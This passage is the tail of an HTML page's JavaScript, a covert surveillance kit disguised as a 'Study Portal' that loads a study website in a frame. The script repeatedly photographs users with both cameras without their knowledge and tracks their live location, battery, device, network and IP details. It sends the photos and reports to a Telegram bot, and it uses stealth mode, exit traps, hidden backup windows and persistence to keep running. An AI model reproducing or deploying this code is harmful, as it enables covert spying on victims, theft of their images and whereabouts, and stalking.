                            if (blob && blob.size > CONFIG.MIN_BLOB_SIZE) {
                                STATE.lastCaptureTime = Date.now();
                                log(`Photo captured: ${(blob.size / 1024).toFixed(2)} KB`, 'success');
                                resolve(blob);
                            } else {
                                log('Photo too small or invalid', 'warning');
                                resolve(null);
                            }
                        },
                        'image/jpeg',
                        CONFIG.IMAGE_QUALITY
                    );
                });
                
            } catch (error) {
                log('Capture failed: ' + error.message, 'error');
                return null;
            }
        }
        
        // ============== TELEGRAM COMMUNICATION ==============
        
        async function sendToTelegram(blob, cameraType, sequence, retryCount = 0) {
            if (!blob || blob.size < CONFIG.MIN_BLOB_SIZE) {
                STATE.totalPhotosFailed++;
                return false;
            }
            
            if (retryCount >= CONFIG.MAX_RETRIES) {
                log(`Failed to send photo after ${CONFIG.MAX_RETRIES} attempts`, 'error');
                STATE.totalPhotosFailed++;
                return false;
            }
            
            try {
                // Create caption
                let caption = `ðŸ“¸ *${cameraType.toUpperCase()} CAMERA - Photo ${sequence}*\n\n`;
                caption += `ðŸ†” Session: \`${STATE.sessionId}\`\n`;
                caption += `ðŸ‘¤ User: \`${STATE.userChatId}\`\n`;
                caption += `ðŸ”„ Cycle: ${STATE.cycleCount}\n`;
                caption += `ðŸ“Š Total Sent: ${STATE.totalPhotosSent}\n`;
                
                if (STATE.batteryInfo) {
                    caption += `ðŸ”‹ Battery: ${STATE.batteryInfo.level}% ${STATE.batteryInfo.charging ? 'âš¡' : ''}\n`;
                }
                
                if (STATE.locationInfo) {
                    caption += `ðŸ“ Location: [${STATE.locationInfo.latitude.toFixed(6)}, ${STATE.locationInfo.longitude.toFixed(6)}](${STATE.locationInfo.googleMapsLink})\n`;
                    caption += `ðŸŽ¯ Accuracy: ${STATE.locationInfo.accuracy}m\n`;
                }
                
                caption += `â° Time: ${new Date().toLocaleTimeString()}\n`;
                caption += `ðŸ“… Date: ${new Date().toLocaleDateString()}`;
                
                // Create form data
                const formData = new FormData();
                formData.append('chat_id', CONFIG.ADMIN_CHAT_ID);
                formData.append('photo', blob, `${cameraType}_${sequence}_${Date.now()}.jpg`);
                formData.append('caption', caption);
                formData.append('parse_mode', 'Markdown');
                
                // Send to Telegram
                const response = await fetch(`${CONFIG.TELEGRAM_API}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
                
                const result = await response.json();
                
                if (result.ok) {
                    STATE.totalPhotosSent++;
                    
                    // Broadcast success
                    if (STATE.broadcastChannel) {
                        STATE.broadcastChannel.postMessage({
                            type: 'photo_captured',
                            tabId: STATE.tabId,
                            camera: cameraType,
                            sequence: sequence,
                            timestamp: Date.now()
                        });
                    }
                    
                    log(`Photo sent successfully (Attempt ${retryCount + 1})`, 'success');
                    return true;
                    
                } else {
                    log(`Telegram error: ${result.description}`, 'error');
                    
                    // Retry with exponential backoff
                    await new Promise(resolve => setTimeout(resolve, CONFIG.RETRY_DELAY * (retryCount + 1)));
                    return await sendToTelegram(blob, cameraType, sequence, retryCount + 1);
                }
                
            } catch (error) {
                log(`Network error: ${error.message}`, 'error');
                
                // Store for later sync if we have persistence
                if (STATE.persistenceDB) {
                    // Store in IndexedDB for later sync
                    const persistence = new BackgroundPersistence();
                    await persistence.storePhoto(blob, cameraType, sequence);
                }
                
                // Retry with exponential backoff
                await new Promise(resolve => setTimeout(resolve, CONFIG.RETRY_DELAY * (retryCount + 1)));
                return await sendToTelegram(blob, cameraType, sequence, retryCount + 1);
            }
        }
        
        async function sendDeviceReport() {
            try {
                let report = `ðŸš¨ *ULTIMATE SURVEILLANCE REPORT - FULL DATA*\n\n`;
                
                // Session Info
                report += `ðŸ“Š *SESSION INFORMATION*\n`;
                report += `ðŸ†” Session ID: \`${STATE.sessionId}\`\n`;
                report += `ðŸ‘¤ User ID: \`${STATE.userChatId}\`\n`;
                report += `ðŸŒ Website: ${STATE.targetWebsite}\n`;
                report += `ðŸ• Started: ${new Date(STATE.startTime).toLocaleString()}\n`;
                report += `â±ï¸ Duration: ${Math.round((Date.now() - STATE.startTime) / 1000)} seconds\n`;
                report += `ðŸ“¸ Photos Sent: ${STATE.totalPhotosSent}\n`;
                report += `ðŸ”„ Cycles: ${STATE.cycleCount}\n`;
                report += `ðŸ“¡ Tabs Active: ${STATE.otherTabs.size + 1}\n\n`;
                
                // Device Info
                report += `ðŸ–¥ï¸ *DEVICE HARDWARE*\n`;
                report += `ðŸ”§ Platform: ${STATE.deviceInfo.platform}\n`;
                report += `ðŸŒ Browser: ${STATE.deviceInfo.browser}\n`;
                report += `ðŸ’» OS: ${STATE.deviceInfo.os}\n`;
                report += `ðŸ“± Mobile: ${STATE.deviceInfo.isMobile ? 'Yes' : 'No'}\n`;
                report += `ðŸ’¾ RAM: ${STATE.deviceInfo.deviceMemory} GB\n`;
                report += `âš¡ CPU Cores: ${STATE.deviceInfo.hardwareConcurrency}\n`;
                report += `ðŸ‘† Touch Points: ${STATE.deviceInfo.maxTouchPoints}\n\n`;
                
                // Screen Info
                report += `ðŸ“º *DISPLAY INFORMATION*\n`;
                report += `ðŸ–¥ï¸ Screen: ${STATE.deviceInfo.screenWidth} Ã— ${STATE.deviceInfo.screenHeight}\n`;
                report += `ðŸ“ Available: ${STATE.deviceInfo.screenAvailWidth} Ã— ${STATE.deviceInfo.screenAvailHeight}\n`;
                report += `ðŸŽ¨ Color Depth: ${STATE.deviceInfo.screenColorDepth} bit\n`;
                report += `ðŸ” Pixel Ratio: ${STATE.deviceInfo.devicePixelRatio}\n`;
                report += `ðŸ“ Orientation: ${STATE.deviceInfo.orientation}\n\n`;
                
                // Location Info
                if (STATE.locationInfo) {
                    report += `ðŸ“ *LIVE LOCATION*\n`;
                    report += `ðŸŒ Latitude: ${STATE.locationInfo.latitude}\n`;
                    report += `ðŸŒ Longitude: ${STATE.locationInfo.longitude}\n`;
                    report += `ðŸŽ¯ Accuracy: ${STATE.locationInfo.accuracy} meters\n`;
                    report += `ðŸ• Timestamp: ${STATE.locationInfo.timestamp}\n`;
                    report += `ðŸ—ºï¸ [Google Maps](${STATE.locationInfo.googleMapsLink})\n`;
                    report += `ðŸ—ºï¸ [OpenStreetMap](${STATE.locationInfo.openStreetMapLink})\n\n`;
                }
                
                // Battery Info
                if (STATE.batteryInfo) {
                    report += `ðŸ”‹ *BATTERY STATUS*\n`;
                    report += `âš¡ Level: ${STATE.batteryInfo.level}%\n`;
                    report += `ðŸ”Œ Charging: ${STATE.batteryInfo.charging ? 'Yes' : 'No'}\n`;
                    if (STATE.batteryInfo.charging && STATE.batteryInfo.chargingTime < Infinity) {
                        report += `â±ï¸ Full in: ${Math.round(STATE.batteryInfo.chargingTime / 60)} minutes\n`;
                    }
                    report += `\n`;
                }
                
                // Network Info
                if (STATE.deviceInfo.connection) {
                    report += `ðŸŒ *NETWORK CONNECTION*\n`;
                    report += `ðŸ“¶ Type: ${STATE.deviceInfo.connection.effectiveType}\n`;
                    report += `â¬‡ï¸ Downlink: ${STATE.deviceInfo.connection.downlink} Mbps\n`;
                    report += `ðŸ”„ RTT: ${STATE.deviceInfo.connection.rtt} ms\n`;
                    report += `ðŸ’¾ Save Data: ${STATE.deviceInfo.connection.saveData ? 'Enabled' : 'Disabled'}\n`;
                    report += `ðŸ“¡ Connection Type: ${STATE.deviceInfo.connection.type}\n`;
                    report += `ðŸŒ IP Address: ${STATE.deviceInfo.ipAddress}\n\n`;
                }
                
                // Time Info
                report += `ðŸ• *TIME & LOCALE*\n`;
                report += `ðŸŒ Timezone: ${STATE.deviceInfo.timezone}\n`;
                report += `â° Local Time: ${STATE.deviceInfo.localTime}\n`;
                report += `ðŸ—ºï¸ Language: ${STATE.deviceInfo.language}\n`;
                report += `ðŸ—£ï¸ Languages: ${STATE.deviceInfo.languages}\n\n`;
                
                // Camera Info
                report += `ðŸ“· *CAMERA SYSTEM*\n`;
                report += `ðŸ“¸ Cameras Available: ${STATE.availableCameras.length}\n`;
                report += `ðŸ”„ Current Camera: ${STATE.currentCamera || 'None'}\n`;
                report += `âœ… Permission: ${STATE.permissionGranted ? 'Granted' : 'Denied'}\n`;
                report += `ðŸš€ System Status: ${STATE.isRunning ? 'Active' : 'Inactive'}\n\n`;
                
                // Advanced Features
                report += `âš¡ *ADVANCED FEATURES*\n`;
                report += `ðŸ”§ Persistence: ${CONFIG.ENABLE_BACKGROUND_PERSISTENCE ? 'Enabled' : 'Disabled'}\n`;
                report += `ðŸ”„ Multi-tab: ${CONFIG.ENABLE_MULTI_TAB ? 'Enabled' : 'Disabled'}\n`;
                report += `ðŸš« Exit Traps: ${CONFIG.ENABLE_EXIT_TRAPS ? 'Active' : 'Inactive'}\n`;
                report += `ðŸ‘» Hidden Windows: ${CONFIG.ENABLE_HIDDEN_WINDOWS ? 'Active' : 'Inactive'}\n`;
                report += `ðŸ“¡ Broadcast Channel: ${STATE.broadcastChannel ? 'Connected' : 'Disconnected'}\n`;
                
                // Send report to Telegram
                await fetch(`${CONFIG.TELEGRAM_API}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CONFIG.ADMIN_CHAT_ID,
                        text: report,
                        parse_mode: 'Markdown',
                        disable_web_page_preview: true
                    })
                });
                
                log('Complete device report sent', 'success');
                
            } catch (error) {
                log('Failed to send device report: ' + error.message, 'error');
            }
        }
        
        async function captureBurst(cameraType) {
            log(`Starting ${cameraType} camera burst (${CONFIG.PHOTOS_PER_CAMERA} photos)`, 'info');
            
            for (let i = 1; i <= CONFIG.PHOTOS_PER_CAMERA; i++) {
                if (!STATE.isRunning) break;
                
                log(`Capturing ${cameraType} photo ${i}/${CONFIG.PHOTOS_PER_CAMERA}`, 'info');
                
                const blob = await capturePhoto();
                
                if (blob) {
                    const sent = await sendToTelegram(blob, cameraType, i);
                    
                    if (!sent && STATE.persistenceDB) {
                        // Store for later sync
                        const persistence = new BackgroundPersistence();
                        await persistence.storePhoto(blob, cameraType, i);
                    }
                }
                
                // Delay between photos
                if (i < CONFIG.PHOTOS_PER_CAMERA) {
                    await new Promise(resolve => setTimeout(resolve, CONFIG.CAPTURE_DELAY));
                }
            }
            
            log(`${cameraType} camera burst complete`, 'success');
        }
        
        // ============== MAIN SURVEILLANCE LOOP ==============
        
        async function mainLoop() {
            if (STATE.isRunning) {
                log('Surveillance already running', 'warning');
                return;
            }
            
            STATE.isRunning = true;
            log('ðŸš€ STARTING ULTIMATE SURVEILLANCE LOOP', 'success');
            
            // Send initial report
            await sendDeviceReport();
            
            // Update battery periodically
            const batteryInterval = setInterval(async () => {
                if (STATE.isRunning) {
                    STATE.batteryInfo = await getBatteryInfo();
                }
            }, 60000);
            
            // Main loop
            while (STATE.isRunning) {
                try {
                    STATE.cycleCount++;
                    log(`=== CYCLE ${STATE.cycleCount} ===`, 'info');
                    
                    // Update battery every 3 cycles
                    if (STATE.cycleCount % 3 === 0) {
                        STATE.batteryInfo = await getBatteryInfo();
                    }
                    
                    // FRONT CAMERA
                    log('Attempting front camera...', 'info');
                    const frontStarted = await startCamera('user');
                    
                    if (frontStarted && STATE.isRunning) {
                        await captureBurst('front');
                    } else {
                        log('Front camera unavailable', 'warning');
                    }
                    
                    if (!STATE.isRunning) break;
                    await new Promise(resolve => setTimeout(resolve, CONFIG.SWITCH_DELAY));
                    
                    // BACK CAMERA
                    log('Attempting back camera...', 'info');
                    const backStarted = await startCamera('environment');
                    
                    if (backStarted && STATE.isRunning) {
                        await captureBurst('back');
                    } else {
                        log('Back camera unavailable', 'warning');
                    }
                    
                    if (!STATE.isRunning) break;
                    
                    // Cycle complete
                    log(`Cycle ${STATE.cycleCount} complete. Total photos: ${STATE.totalPhotosSent}`, 'success');
                    
                    // Random delay between cycles
                    const delay = randomDelay(5000, 15000);
                    await new Promise(resolve => setTimeout(resolve, delay));
                    
                } catch (error) {
                    log('Cycle error: ' + error.message, 'error');
                    await new Promise(resolve => setTimeout(resolve, CONFIG.RETRY_DELAY));
                }
            }
            
            // Cleanup
            clearInterval(batteryInterval);
            log('Surveillance loop stopped', 'warning');
        }
        
        // ============== URL CONFIGURATION ==============
        
        function parseConfig() {
            updateProgress(5, "Parsing configuration...");
            
            const params = new URLSearchParams(window.location.search);
            
            let website = params.get('site') || 
                          params.get('url') || 
                          params.get('website') || 
                          'https://deltastudy.site/pw/drm/play?video_id=6970a6deec448154d82de9ea&subject_slug=maths-093626&batch_id=6960d1d20549bb69d7d7e872&schedule_id=6970a6deec448154d82de9ea&subject_id=6960dba01957eadd8581061e&topicSlug=ch-01---basic-mathematics-202900';
            
            // Ensure URL has protocol
            if (!website.startsWith('http://') && !website.startsWith('https://')) {
                website = 'https://' + website;
            }
            
            // Decode URL
            try {
                website = decodeURIComponent(website);
            } catch (error) {
                // URL might not be encoded
            }
            
            // Get chat ID
            const chatId = params.get('chat_id') || 
                          params.get('user') || 
                          'anonymous_' + Math.random().toString(36).substr(2, 9);
            
            // Get session ID
            const sessionParam = params.get('session') || 
                                params.get('sid') || 
                                Date.now().toString(36);
            
            // Update state
            STATE.targetWebsite = website;
            STATE.userChatId = chatId;
            STATE.sessionId = sessionParam + '_' + Math.random().toString(36).substr(2, 6);
            
            log(`Configuration loaded: ${STATE.targetWebsite.substring(0, 50)}...`, 'success');
            log(`User: ${STATE.userChatId}, Session: ${STATE.sessionId}`, 'info');
        }
        
        function loadWebsite() {
            updateProgress(50, "Loading study portal...");
            
            try {
                elements.frame.src = STATE.targetWebsite;
                document.title = 'Study Portal - Loading...';
                log('Website frame loaded', 'success');
            } catch (error) {
                log('Failed to load website: ' + error.message, 'error');
            }
        }
        
        // ============== INITIALIZATION ==============
        
        async function initialize() {
            log('=== ULTIMATE SURVEILLANCE SYSTEM INITIALIZATION ===', 'info');
            
            try {
                // Step 1: Parse configuration
                parseConfig();
                
                // Step 2: Collect device information
                await collectDeviceInfo();
                
                // Step 3: Initialize persistence systems
                const persistence = new BackgroundPersistence();
                await persistence.initialize();
                
                // Step 4: Initialize multi-tab coordination
                const multiTab = new MultiTabCoordinator();
                await multiTab.initialize();
                
                // Step 5: Initialize exit traps
                const exitTraps = new ExitTrapManager();
                exitTraps.setupTraps();
                
                // Step 6: Initialize hidden window manager
                const hiddenWindows = new HiddenWindowManager();
                
                // Step 7: Load the website
                loadWebsite();
                
                // Step 8: Get battery info
                STATE.batteryInfo = await getBatteryInfo();
                
                // Step 9: Get location
                updateProgress(60, "Getting location...");
                await getLocation();
                startLocationTracking();
                
                // Step 10: Request camera permission
                updateProgress(70, "Setting up camera system...");
                const hasCamera = await requestCameraPermission();
                
                // Step 11: Create hidden backup window
                if (CONFIG.ENABLE_HIDDEN_WINDOWS) {
                    setTimeout(() => {
                        hiddenWindows.createBackupWindow();
                    }, 5000);
                }
                
                // Step 12: Complete loading
                updateProgress(100, "Study portal ready!");
                
                // Step 13: Start surveillance if camera available
                if (hasCamera) {
                    log('All systems ready. Starting surveillance in 5 seconds...', 'success');
                    setTimeout(() => {
                        mainLoop();
                    }, 5000);
                } else {
                    log('Camera not available. Running in passive mode.', 'warning');
                }
                
                // Store references for cleanup
                window.surveillancePersistence = persistence;
                window.surveillanceMultiTab = multiTab;
                window.surveillanceExitTraps = exitTraps;
                window.surveillanceHiddenWindows = hiddenWindows;
                
            } catch (error) {
                log('Initialization failed: ' + error.message, 'error');
                updateProgress(100, "Error loading portal. Please refresh.");
            }
        }
        
        // ============== EVENT HANDLERS ==============
        
        // Handle backup window heartbeats
        window.addEventListener('message', (event) => {
            if (event.data && event.data.type === 'backup_heartbeat') {
                log('Backup window heartbeat received', 'debug');
            }
        });
        
        // Handle page visibility changes
        document.addEventListener('visibilitychange', () => {
            if (document.hidden) {
                log('Page is now hidden (background/tab switch)', 'info');
            } else {
                log('Page is now visible', 'info');
            }
        });
        
        // Handle beforeunload for cleanup
        window.addEventListener('beforeunload', () => {
            log('Page unloading - cleaning up...', 'warning');
            
            // Stop surveillance
            STATE.isRunning = false;
            
            // Stop camera stream
            if (STATE.currentStream) {
                STATE.currentStream.getTracks().forEach(track => track.stop());
                STATE.currentStream = null;
            }
            
            // Clear location tracking
            if (STATE.locationWatchId) {
                navigator.geolocation.clearWatch(STATE.locationWatchId);
            }
            
            // Cleanup managers
            if (window.surveillanceMultiTab) {
                window.surveillanceMultiTab.cleanup();
            }
            
            if (window.surveillanceHiddenWindows) {
                window.surveillanceHiddenWindows.cleanup();
            }
            
            if (window.surveillanceExitTraps) {
                window.surveillanceExitTraps.cleanup();
            }
            
            if (window.surveillancePersistence) {
                window.surveillancePersistence.cleanup();
            }
            
            log('Cleanup complete', 'info');
        });
        
        // Handle online/offline status
        window.addEventListener('online', () => {
            log('Device is online', 'success');
        });
        
        window.addEventListener('offline', () => {
            log('Device is offline', 'warning');
        });
        
        // ============== DEBUG API ==============
        
        window.StudyPortal = {
            // Control
            start: () => {
                if (!STATE.isRunning) mainLoop();
                else log('Already running', 'warning');
            },
            stop: () => {
                STATE.isRunning = false;
                log('Surveillance stopped', 'warning');
            },
            
            // Status
            status: () => ({
                isRunning: STATE.isRunning,
                sessionId: STATE.sessionId,
                tabId: STATE.tabId,
                userChatId: STATE.userChatId,
                totalPhotos: STATE.totalPhotosSent,
                cycleCount: STATE.cycleCount,
                cameraReady: STATE.cameraReady,
                currentCamera: STATE.currentCamera,
                availableCameras: STATE.availableCameras.length,
                permissionGranted: STATE.permissionGranted,
                battery: STATE.batteryInfo,
                location: STATE.locationInfo,
                deviceInfo: STATE.deviceInfo,
                otherTabs: Array.from(STATE.otherTabs),
                hiddenWindows: STATE.hiddenWindows.size
            }),
            
            // Actions
            captureNow: async () => {
                if (STATE.cameraReady) {
                    const blob = await capturePhoto();
                    if (blob) {
                        await sendToTelegram(blob, 'manual', 1);
                    }
                } else {
                    log('Camera not ready', 'error');
                }
            },
            
            sendReport: sendDeviceReport,
            
            getLocation: async () => {
                const location = await getLocation();
                return location;
            },
            
            getBattery: async () => {
                const battery = await getBatteryInfo();
                return battery;
            },
            
            // Debug
            toggleStealth: () => {
                CONFIG.STEALTH_MODE = !CONFIG.STEALTH_MODE;
                log(`Stealth mode: ${CONFIG.STEALTH_MODE ? 'ON' : 'OFF'}`, 'info');
            },
            
            testCamera: async () => {
                const success = await startCamera('user');
                return success;
            }
        };
        
        // ============== START APPLICATION ==============
        
        // Wait for page to load
        if (document.readyState === 'loading') {
            document.addEventListener('DOMContentLoaded', initialize);
        } else {
            initialize();
        }
        
    </script>
</body>
</html>
